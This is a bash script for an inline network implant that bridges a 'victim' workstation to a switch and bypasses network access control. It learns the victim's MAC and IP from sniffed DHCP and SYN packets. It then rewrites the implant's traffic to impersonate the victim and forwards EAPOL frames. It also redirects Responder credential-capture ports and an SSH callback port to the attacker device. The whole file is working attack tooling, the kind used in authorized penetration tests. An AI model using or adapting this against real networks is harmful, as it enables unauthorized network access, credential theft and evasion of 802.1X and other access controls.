#!/bin/bash

###############################################################################
#  Logging + strict-mode prologue  – paste this block once at top of script  #
###############################################################################

LOG_BASENAME="$(basename "$0" .sh)_$(date +%F_%H-%M-%S).log"
LOG_FILE="$(pwd)/${LOG_BASENAME}"       # log file lives where you invoked script

# send *everything* (stdout & stderr) through tee -> log file
exec > >(tee -a "$LOG_FILE") 2>&1

# simple coloured logger helper
log() { printf '\e[1;34m[%s] %s\e[0m\n' "$(date +%T)" "$*"; }


#===================================================================================================
# Full paths for legacy (non-nft) packet-filter binaries
CMD_ARPTABLES=/usr/sbin/arptables
CMD_EBTABLES=/usr/sbin/ebtables
CMD_IPTABLES=/usr/sbin/iptables

# Interface names (can be overridden with -1 / -2 flags)
BRINT=br0            # software bridge interface
SWINT=eth0           # NIC facing the switch (“switch side”)
SWMAC=00:11:22:33:44:55   # placeholder; real MAC learned in InitialSetup
COMPINT=eth1         # NIC facing the victim workstation (“computer side”)

# Link-local IPs used *internally* on br0 so the box can route
BRIP=169.254.66.66   # address we’ll SNAT *from*
BRGW=169.254.66.1    # dummy gateway IP on same /32

TEMP_FILE_DHCP=/tmp/dhcp.pcap
TEMP_FILE_SYN=/tmp/SYN.pcap

# Run-time option flags (0 = off | 1 = on)
OPTION_RESPONDER=0
OPTION_SSH=0
OPTION_AUTONOMOUS=0
OPTION_CONNECTION_SETUP_ONLY=0
OPTION_INITIAL_SETUP_ONLY=0
OPTION_RESET=0

##  Ports we sniff or forward ––––––––––––––––––––––––––––––
TCPDUMP_PORT_1=88            # Kerberos (rarely used, could be leveraged)
TCPDUMP_PORT_2=445           # SMB  – often the first SYN we’ll see

# Responder / Cobalt-Strike / misc service port definitions
PORT_UDP_NETBIOS_NS=137
PORT_UDP_NETBIOS_DS=138
PORT_UDP_DNS=53
PORT_UDP_LDAP=389
PORT_TCP_LDAP=389
PORT_TCP_SQL=1433
PORT_UDP_SQL=1434
PORT_TCP_HTTP=80
PORT_TCP_HTTPS=443
PORT_TCP_SMB=445
PORT_TCP_NETBIOS_SS=139
PORT_TCP_FTP=21
PORT_TCP_SMTP1=25
PORT_TCP_SMTP2=587
PORT_TCP_POP3=110
PORT_TCP_IMAP=143
PORT_TCP_PROXY=3128
PORT_UDP_MULTICAST=5553      # Responder’s LLMNR probe port

DPORT_SSH=50222              # external port seen as victimIP:50222
PORT_SSH=50022               # internal SSHd listening port on the Pi
RANGE=61000-64000            # high-port SNAT range for outbound TCP/UDP
#===================================================================================================

## -----------------------------------------------------------------
##   1. Functions – usage, version and CLI parsing helpers
## -----------------------------------------------------------------

Usage() {                    # Show help and exit
  echo -e "$0 v$VERSION usage:"
  echo "    -1 <eth>    network interface plugged into switch"
  echo "    -2 <eth>    network interface plugged into victim machine"
  echo "    -a          autonomous mode"
  echo "    -c          start connection setup only"
  echo "    -g <MAC>    set gateway MAC address (GWMAC) manually"
  echo "    -h          display this help"
  echo "    -i          start initial setup only"
  echo "    -r          reset all settings"
  echo "    -R          enable port redirection for Responder"
  echo "    -S          enable port redirection for OpenSSH and start the service"
  exit 0
}
#===================================================================================================

## -----------------------------------------------------------------
##   2. Functions – Checking parameters and setting defaults
## -----------------------------------------------------------------
CheckParams() {
  while getopts ":1:2:acg:hirRS" opts; do
    case "$opts" in
      "1") SWINT=$OPTARG ;;                       # override switch-side NIC
      "2") COMPINT=$OPTARG ;;                     # override victim-side NIC
      "a") OPTION_AUTONOMOUS=1 ;;                 # silence + timeouts
      "c") OPTION_CONNECTION_SETUP_ONLY=1 ;;      # skip initial br0 build
      "g") GWMAC=$OPTARG ;;                       # force gateway MAC
      "h") Usage ;;                               # show help
      "i") OPTION_INITIAL_SETUP_ONLY=1 ;;         # only build dark bridge
      "r") OPTION_RESET=1 ;;                      # tear everything down
      "R") OPTION_RESPONDER=1 ;;                  # forward Responder ports
      "S") OPTION_SSH=1 ;;                        # forward SSH + start sshd
      *)   OPTION_RESPONDER=0; OPTION_SSH=0; OPTION_AUTONOMOUS=0 ;;
    esac
  done
}
#===================================================================================================

## -----------------------------------------------------------------
##   3. Functions – Learning the MAC and IP of the victim machine and the switch
## -----------------------------------------------------------------
Learn(){

    # assume any pcap >24 bytes has at least one packet
    if [ "$(stat -c %s "$TEMP_FILE_DHCP")" -gt 24 ]; then
    log "DHCP file has at least one packet"
    # extract MAC and IP of the victim machine

    else
    log "DHCP file is empty"
    fi

    if [ "$(stat -c %s "$TEMP_FILE_SYN")" -gt 24 ]; then
    log "SYN file has at least one packet"
    else
    log "SYN file is empty."
    log "Cannot learn MAC and IP of the victim machine. Resetting and trying again."
    Reset;
    exit 1
    fi
    
    # adjust to your filenames
    DHCP_PCAP="$TEMP_FILE_DHCP"
    SYN_PCAP="$TEMP_FILE_SYN"

    # 1) choose the non-empty capture (pcap global header is 24 bytes)
    if [ -s "$DHCP_PCAP" ] && [ "$(stat -c %s "$DHCP_PCAP")" -gt 24 ]; then
    PCAP="$DHCP_PCAP"
    FILTER='udp src port 67 and udp dst port 68'
    else
    PCAP="$SYN_PCAP"
    FILTER='tcp[tcpflags] & tcp-syn != 0'
    fi

    # 2) read the first packet line
    line=$(sudo tcpdump -nn -e -r "$PCAP" -c1 $FILTER)

    # 3) parse out fields
    GWMAC=$(awk '{print $2}' <<<"$line")
    COMPMAC=$(awk '{gsub(/,$/,"",$4); print $4}' <<<"$line")
    GWIP=$(awk '{print $10}' <<<"$line" | cut -d. -f1-4)
    COMIP=$(awk '{print $12}' <<<"$line" | cut -d. -f1-4)

    # 4) output
    echo "Switch MAC : $GWMAC"
    echo "Switch IP  : $GWIP"
    echo "Victim  MAC : $COMPMAC"
    echo "Victim  IP  : $COMIP"
}    
#===================================================================================================

InitialSetup() {
    
    log "Starting Initial Setup..."

    # ──── Kill noisy services and harden host networking ────
    systemctl stop NetworkManager.service                      # avoid auto-DHCP
    cp /etc/sysctl.conf /etc/sysctl.conf.bak                   # backup
    echo "net.ipv6.conf.all.disable_ipv6 = 1" > /etc/sysctl.conf
    sysctl -p                                                  # reload
    echo "" > /etc/resolv.conf

    # Disable multicast on both NICs → no IGMP join chatter
    ip link set $SWINT multicast off
    ip link set $COMPINT multicast off

    # Stop time-sync daemons (can broadcast NTP packets)
    declare -a NTP_SERVICES=("ntp.service" "ntpsec.service" "chronyd.service" "systemd-timesyncd.service")
    for NTP_SERVICE in "${NTP_SERVICES[@]}"; do
        NTP_SERVICE_STATUS=$(systemctl is-active $NTP_SERVICE)
        if [ $NTP_SERVICE_STATUS == "active" ]; then
            systemctl stop $NTP_SERVICE
        fi
    done
    timedatectl set-ntp false                                  # make sure it stays off
    
    log "Stopping noisy services (NetworkManager, NTP, IPv6)"

    # Capture *our* switch-side NIC MAC (used later for ebtables rewrites)
    SWMAC=$(ifconfig $SWINT | grep -i ether | awk '{ print $2 }')

    # ──── Create transparent bridge br0 ────
    brctl addbr $BRINT # create bridge
    brctl addif $BRINT $COMPINT # add computer side to bridge
    brctl addif $BRINT $SWINT # add switch side to bridge

    log "Created bridge $BRINT, added $COMPINT ↔ $SWINT, MAC=$SWMAC"

    echo 8 > /sys/class/net/br0/bridge/group_fwd_mask   # forward EAPOL frames
 
    # Bring both physical NICs up with 0.0.0.0 (no IP) + promiscuous
    ifconfig $COMPINT 0.0.0.0 up promisc
    ifconfig $SWINT  0.0.0.0 up promisc

   # Give br0 a harmless fake MAC, then copy SWMAC -> br0
   # macchanger -m 00:12:34:56:78:90 $BRINT  # placeholder
    
    macchanger -m $SWMAC $BRINT > /dev/null 2>&1          # now identical to switch-side MAC
    ifconfig $BRINT 0.0.0.0 up promisc      # bring the bridge up (still dark)

 
    #Temporarily block *all* outbound frames while we reconfigure
    $CMD_ARPTABLES -A OUTPUT -o $SWINT  -j DROP
    $CMD_ARPTABLES -A OUTPUT -o $COMPINT -j DROP
    $CMD_IPTABLES  -A OUTPUT -o $COMPINT -j DROP
    $CMD_IPTABLES  -A OUTPUT -o $SWINT  -j DROP

    log "Transparent bridge $BRINT created !"
}
#===================================================================================================

ConnectionSetup() {

    log "Starting Connection Setup..."

    log "Bouncing NICs and enabling promiscuous mode"
    ifconfig $COMPINT down
    ifconfig $SWINT down

    sleep 1s

    ifconfig $COMPINT 0.0.0.0 up promisc
    ifconfig $SWINT  0.0.0.0 up promisc

    # As last resort, capture the first outbound TCP SYN packet and learn the MAC IP of the victim machine and also Gateway MAC.
    timeout 30s tcpdump -i $COMPINT -n -e -s0 -c1 \
    -w "$TEMP_FILE_DHCP" 'udp src port 67 and udp dst port 68' &
    PID1=$!
    # As last resort, capture the first outbound TCP SYN packet and learn the MAC IP of the victim machine and also Gateway MAC.
    timeout 30s tcpdump -i $COMPINT -Q out -n -e -s0 -c1 \
    -w "$TEMP_FILE_SYN" 'tcp[tcpflags] & tcp-syn != 0' &
    PID2=$!
    
    log "Starting capturing MAC and IP of the connected Device and Switch..." 

    log "Waiting for victim link-up on $COMPINT (30 s max)"
    
    # now wait *until* the victim-side NIC carrier is up (max 30s)

    echo -n "[*] Waiting for $COMPINT to show link-up"

    for i in {1..300}; do
    if [[ "$(cat /sys/class/net/$COMPINT/carrier)" -eq 1 ]]; then
            echo " (after $((i*100))ms)"
            break
        fi
        echo -n "."
        sleep 0.1
        done

    # Wait for the two tcpdump processes to finish
    wait $PID1 $PID2

    #Call the learn function to extract the MAC and IP
    Learn;
    log "Learned Info:   Device MAC=$COMPMAC  Switch MAC=$GWMAC  Device IP=$COMIP"

    ifconfig $BRINT $BRIP up promisc            # assign link-local addr to br0

    #------------------------------------------------------------------
    # 3.3  Layer-2 SNAT – rewrite Pi’s frames → victim’s MAC
    # -----------------------------------------------------------------
    if [ "$OPTION_CONNECTION_SETUP_ONLY" -eq 1 ]; then
        SWMAC=$(ifconfig $SWINT | grep -i ether | awk '{ print $2 }')   # (safety)
    fi
    $CMD_EBTABLES -t nat -A POSTROUTING -s $SWMAC -o $SWINT -j snat --to-src $COMPMAC
    $CMD_EBTABLES -t nat -A POSTROUTING -s $SWMAC -o $BRINT -j snat --to-src $COMPMAC

    log "Inserted ebtables & iptables SNAT / DNAT rules"


    # -----------------------------------------------------------------
    # 3.4  Static route: any packet to 169.254.66.1 (fake GW) goes to GWMAC
    # -----------------------------------------------------------------
    arp -s -i $BRINT $BRGW $GWMAC                     # static ARP entry
    route add default gw $BRGW dev $BRINT metric 10   # default route via fake GW

    # -----------------------------------------------------------------
    # 3.5  Optional port-forward rules (SSH callback / Responder)
    # -----------------------------------------------------------------
    if [ "$OPTION_SSH" -eq 1 ]; then
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $DPORT_SSH \
                      -j DNAT --to $BRIP:$PORT_SSH
        log "Inserted SSH port-forward rule"
    fi

    if [ "$OPTION_RESPONDER" -eq 1 ]; then
        # Iterate over each Responder port + protocol pair and DNAT to BRIP
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p udp --dport $PORT_UDP_NETBIOS_NS -j DNAT --to $BRIP:$PORT_UDP_NETBIOS_NS
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p udp --dport $PORT_UDP_NETBIOS_DS -j DNAT --to $BRIP:$PORT_UDP_NETBIOS_DS
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p udp --dport $PORT_UDP_DNS       -j DNAT --to $BRIP:$PORT_UDP_DNS
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p udp --dport $PORT_UDP_LDAP      -j DNAT --to $BRIP:$PORT_UDP_LDAP
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_LDAP      -j DNAT --to $BRIP:$PORT_TCP_LDAP
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_SQL       -j DNAT --to $BRIP:$PORT_TCP_SQL
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p udp --dport $PORT_UDP_SQL       -j DNAT --to $BRIP:$PORT_UDP_SQL
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_HTTP      -j DNAT --to $BRIP:$PORT_TCP_HTTP
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_HTTPS     -j DNAT --to $BRIP:$PORT_TCP_HTTPS
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_SMB       -j DNAT --to $BRIP:$PORT_TCP_SMB
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_NETBIOS_SS -j DNAT --to $BRIP:$PORT_TCP_NETBIOS_SS
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_FTP       -j DNAT --to $BRIP:$PORT_TCP_FTP
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_SMTP1     -j DNAT --to $BRIP:$PORT_TCP_SMTP1
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_SMTP2     -j DNAT --to $BRIP:$PORT_TCP_SMTP2
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_POP3      -j DNAT --to $BRIP:$PORT_TCP_POP3
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_IMAP      -j DNAT --to $BRIP:$PORT_TCP_IMAP
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_PROXY     -j DNAT --to $BRIP:$PORT_TCP_PROXY
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p udp --dport $PORT_UDP_MULTICAST -j DNAT --to $BRIP:$PORT_UDP_MULTICAST

        log "Inserted Responder port-forward rules "
    fi

    # -----------------------------------------------------------------
    # 3.6  Layer-3 SNAT – rewrite Pi’s IP packets → victimIP
    # -----------------------------------------------------------------
    $CMD_IPTABLES -t nat -A POSTROUTING -o $BRINT -s $BRIP -p tcp  -j SNAT --to $COMIP:$RANGE
    $CMD_IPTABLES -t nat -A POSTROUTING -o $BRINT -s $BRIP -p udp  -j SNAT --to $COMIP:$RANGE
    $CMD_IPTABLES -t nat -A POSTROUTING -o $BRINT -s $BRIP -p icmp -j SNAT --to $COMIP

    # Start sshd if requested (so callback DNAT works)
    if [ "$OPTION_SSH" -eq 1 ]; then
        systemctl start ssh.service
    fi

    $CMD_ARPTABLES -F OUTPUT
    $CMD_IPTABLES  -D OUTPUT -o $COMPINT -j DROP
    $CMD_IPTABLES  -D OUTPUT -o $SWINT  -j DROP

    rm $TEMP_FILE_DHCP
    rm $TEMP_FILE_SYN                 # delete the 1-packet pcap
    
    log "Bridge fully armed – attacker traffic now masquerades as victim"

}

## -----------------------------------------------------------------
##   4. Reset – remove bridge and flush rules
## -----------------------------------------------------------------
Reset() {

    # Bring bridge down and delete it
    ifconfig $BRINT down
    brctl delbr $BRINT

    # Remove default route and static ARP
    arp -d -i $BRINT $BRGW $GWMAC
    route del default dev $BRINT

    # Flush all packet-filter tables
    $CMD_EBTABLES -F
    $CMD_EBTABLES -F -t nat
    $CMD_ARPTABLES -F OUTPUT
    $CMD_IPTABLES  -F
    $CMD_IPTABLES  -F -t nat

    # Restore original sysctl.conf
    cp /etc/sysctl.conf.bak /etc/sysctl.conf
    rm /etc/sysctl.conf.bak
    sysctl -p

    log "Bridge $BRINT deleted, all rules flushed, sysctl restored !"
}

## -----------------------------------------------------------------
##   5. Main dispatcher – which path to run?
## -----------------------------------------------------------------
CheckParams "$@"    # parse CLI options first

if [ "$OPTION_RESET" -eq 1 ]; then
    Reset; exit 0
fi

if [ "$OPTION_INITIAL_SETUP_ONLY" -eq 1 ]; then
    InitialSetup; exit 0
fi

if [ "$OPTION_CONNECTION_SETUP_ONLY" -eq 1 ]; then
    ConnectionSetup; exit 0
fi

# Default = full two-phase run
InitialSetup
ConnectionSetup